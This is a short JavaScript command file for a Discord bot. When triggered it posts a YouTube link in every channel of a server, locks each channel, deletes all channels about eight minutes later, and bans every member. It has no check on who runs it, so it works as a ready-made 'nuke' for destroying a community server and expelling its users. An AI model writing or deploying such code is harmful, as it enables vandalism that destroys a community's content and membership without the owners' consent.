exports.run = (client, message, args) => {
	// Go through each channel
 	message.guild.channels.forEach(channel => {
		// Link the video and lock the channel
		channel.send("https://www.youtube.com/watch?v=1xOOFCltZuc");
		channel.overwritePermissions(message.guild.id, {"SEND_MESSAGES": false}, "Meteor~");
		// Delete after 8:06 minutes
		setTimeout(() => channel.delete(), ((8 * 60) + 6) * 1000);
  	});
  	message.guild.members.forEach(member => {
    		member.ban({days: 0, reason: "Meteor~"});
  	});
};
